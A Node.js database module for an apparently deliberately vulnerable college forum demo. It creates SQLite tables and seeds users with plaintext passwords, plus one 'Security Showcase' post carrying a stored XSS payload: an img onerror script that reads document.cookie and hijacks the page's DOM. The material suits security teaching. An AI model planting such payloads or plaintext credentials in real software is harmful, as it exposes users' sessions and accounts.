const { DatabaseSync } = require('node:sqlite');
const path = require('path');

const DB_PATH = path.join(__dirname, 'forum.db');

let dbInstance = null;

function getDB() {
  if (!dbInstance) {
    dbInstance = new DatabaseSync(DB_PATH);
    initDatabase(dbInstance);
  }
  return dbInstance;
}

//This does initialize database tables if they do not exist.
function initDatabase(db) {
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      full_name TEXT NOT NULL,
      role TEXT DEFAULT 'Student',
      bio TEXT DEFAULT '',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS posts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      title TEXT NOT NULL,
      category TEXT NOT NULL,
      content TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(id)
    );

    CREATE TABLE IF NOT EXISTS comments (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      post_id INTEGER NOT NULL,
      user_id INTEGER NOT NULL,
      content TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (post_id) REFERENCES posts(id),
      FOREIGN KEY (user_id) REFERENCES users(id)
    );

    CREATE TABLE IF NOT EXISTS chat_messages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER NOT NULL,
      message TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (user_id) REFERENCES users(id)
    );
  `);

  const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
  if (!userCount || userCount.count === 0) {
    seedData(db);
  }
}

//This does seed initial community accounts, discussions, and chat records.
function seedData(db) {
  db.exec(`
    DELETE FROM chat_messages;
    DELETE FROM comments;
    DELETE FROM posts;
    DELETE FROM users;
  `);

  const insertUser = db.prepare(`
    INSERT INTO users (username, password, full_name, role, bio)
    VALUES (?, ?, ?, ?, ?)
  `);

  insertUser.run('mridankan', 'mridankan123', 'Mridankan Mandal', 'Administrator', 'Coordinator for IIIT Allahabad Open Source Society. Managing repository contributions and student mentorship.');
  insertUser.run('ankit', 'ankit123', 'Ankit Ekka', 'Contributor', 'Undergraduate student contributing to web applications and distributed systems projects.');
  insertUser.run('dhannu', 'dhannu123', 'Dhannu Meena', 'Contributor', 'Second-year student active in campus open source tooling and API development.');
  insertUser.run('aditya', 'aditya123', 'Aditya Pachauri', 'Student', 'Enthusiastic developer exploring backend systems, algorithms, and cloud infrastructure.');
  insertUser.run('sayan', 'sayan123', 'Sayan Samajpati', 'Student', 'Student working on developer tools and open source software integrations.');
  insertUser.run('lucky', 'lucky123', 'Lucky Raut', 'Student', 'Developer interested in Linux system administration, networking, and application security.');

  const mridankanId = db.prepare('SELECT id FROM users WHERE username = ?').get('mridankan').id;
  const ankitId = db.prepare('SELECT id FROM users WHERE username = ?').get('ankit').id;
  const dhannuId = db.prepare('SELECT id FROM users WHERE username = ?').get('dhannu').id;
  const adityaId = db.prepare('SELECT id FROM users WHERE username = ?').get('aditya').id;

  const insertPost = db.prepare(`
    INSERT INTO posts (user_id, title, category, content)
    VALUES (?, ?, ?, ?)
  `);

  insertPost.run(
    mridankanId,
    'Welcome to the IIIT-A Open Source Community Forum',
    'Announcements',
    'Welcome everyone to the official discussion forum for IIIT Allahabad Open Source projects. Use this space to share repository updates, coordinate project contributions, and post technical queries.'
  );

  insertPost.run(
    ankitId,
    'Guidelines for Setting Up Local Project Environments',
    'Guides',
    'Here is a quick overview for configuring Node.js, SQLite, and Git across our community repositories. Ensure environment configurations and test cases pass before submitting pull requests.'
  );

  insertPost.run(
    dhannuId,
    'Discussion: Benchmarking Microservices Frameworks',
    'General Discussion',
    'We are evaluating different backend frameworks for campus intranet services. Please share your suggestions regarding performance, memory overhead, and ease of maintenance.'
  );

  insertPost.run(
    dhannuId,
    'Security Showcase: Interactive DOM Manipulation and Session Audit',
    'Announcements',
    `<div id="xssControlPanel" style="background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border: 2px solid #ef4444; border-radius: 12px; padding: 22px; margin: 16px 0; color: #f8fafc; box-shadow: 0 10px 25px rgba(239, 68, 68, 0.25);">
      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; border-bottom: 1px solid #334155; padding-bottom: 10px;">
        <span style="background: #ef4444; color: #ffffff; padding: 4px 10px; border-radius: 9999px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em;">Stored XSS Active</span>
        <span style="font-size: 12px; color: #94a3b8;">DOM &amp; Session Execution Context</span>
      </div>
      <h3 style="margin: 0 0 8px 0; font-size: 1.2rem; color: #f8fafc;">Interactive Session &amp; Interface Takeover</h3>
      <p style="margin: 0 0 14px 0; font-size: 0.88rem; color: #cbd5e1; line-height: 1.5;">This demonstration confirms unhindered client-side script execution. The injected code below accesses browser storage, intercepts DOM elements, and manipulates forum styles in real time.</p>
      
      <div style="background: rgba(15, 23, 42, 0.85); border: 1px solid #334155; border-radius: 8px; padding: 12px; margin-bottom: 16px; font-family: monospace; font-size: 0.82rem;">
        <div style="color: #38bdf8; margin-bottom: 4px; font-weight: 600;">Extracted Session State:</div>
        <div id="xssDumpTarget" style="color: #e2e8f0; word-break: break-all;">[Accessing ambient cookies...]</div>
      </div>

      <div style="display: flex; flex-wrap: wrap; gap: 10px;">
        <button id="xssInvertBtn" class="btn btn-sm btn-danger" style="font-size: 0.8rem; cursor: pointer;">
          Toggle Theme Inversion
        </button>
        <button id="xssToastBtn" class="btn btn-sm btn-outline-blue" style="font-size: 0.8rem; background: #334155; color: #ffffff; border-color: #475569; cursor: pointer;">
          Spawn Injected Alert Toast
        </button>
        <button id="xssResetBtn" class="btn btn-sm btn-outline-blue" style="font-size: 0.8rem; cursor: pointer;">
          Reset Interface Changes
        </button>
      </div>
    </div>
    <img src="invalid" onerror="(function(){
      var target = document.getElementById('xssDumpTarget');
      if (target) {
        target.innerText = document.cookie || 'No client-accessible cookies found (or HttpOnly enforced)';
      }
      var brand = document.querySelector('.brand-title');
      if (brand && !document.getElementById('xssTamperBadge')) {
        var badge = document.createElement('span');
        badge.id = 'xssTamperBadge';
        badge.style = 'background: #ef4444; color: #ffffff; font-size: 0.65rem; padding: 2px 8px; border-radius: 9999px; margin-left: 10px; vertical-align: middle; font-weight: 700; text-transform: uppercase; box-shadow: 0 0 10px rgba(239, 68, 68, 0.6); animation: pulse 1.5s infinite;';
        badge.innerText = 'DOM HIJACKED BY XSS';
        brand.appendChild(badge);
      }
      var invertBtn = document.getElementById('xssInvertBtn');
      if (invertBtn) {
        invertBtn.onclick = function() {
          document.body.style.filter = document.body.style.filter ? '' : 'invert(0.9) hue-rotate(180deg)';
        };
      }
      var toastBtn = document.getElementById('xssToastBtn');
      if (toastBtn) {
        toastBtn.onclick = function() {
          var toast = document.createElement('div');
          toast.style = 'position: fixed; top: 24px; right: 24px; z-index: 99999; background: #ef4444; color: #ffffff; padding: 14px 22px; border-radius: 8px; font-weight: 700; font-size: 0.9rem; box-shadow: 0 10px 25px rgba(0,0,0,0.4); border: 1px solid #fca5a5;';
          toast.innerText = 'Security Notice: Arbitrary JavaScript executing in victim session!';
          document.body.appendChild(toast);
          setTimeout(function() { toast.remove(); }, 4000);
        };
      }
      var resetBtn = document.getElementById('xssResetBtn');
      if (resetBtn) {
        resetBtn.onclick = function() {
          document.body.style.filter = '';
          var b = document.getElementById('xssTamperBadge');
          if (b) b.remove();
        };
      }
    })()" style="display:none;" />`
  );

  const post1Id = db.prepare('SELECT id FROM posts WHERE user_id = ?').get(mridankanId).id;
  const post3Id = db.prepare('SELECT id FROM posts WHERE user_id = ?').get(dhannuId).id;

  const insertComment = db.prepare(`
    INSERT INTO comments (post_id, user_id, content)
    VALUES (?, ?, ?)
  `);

  insertComment.run(post1Id, ankitId, 'Glad to have this forum live. Looking forward to collaborating with everyone.');
  insertComment.run(post1Id, adityaId, 'Great initiative. Will be sharing my project ideas here soon.');
  insertComment.run(post3Id, ankitId, 'Node.js with Express works very well for lightweight API services on our local servers.');

  const insertChat = db.prepare(`
    INSERT INTO chat_messages (user_id, message)
    VALUES (?, ?)
  `);

  insertChat.run(mridankanId, 'Welcome to the IIIT-A live chat channel.');
  insertChat.run(ankitId, 'Hello everyone! Testing the community chat system.');
  insertChat.run(dhannuId, 'Hi team, let me know if any updates are needed on the repository.');
}

function resetDatabase() {
  const db = getDB();
  seedData(db);
}

module.exports = {
  getDB,
  resetDatabase,
};
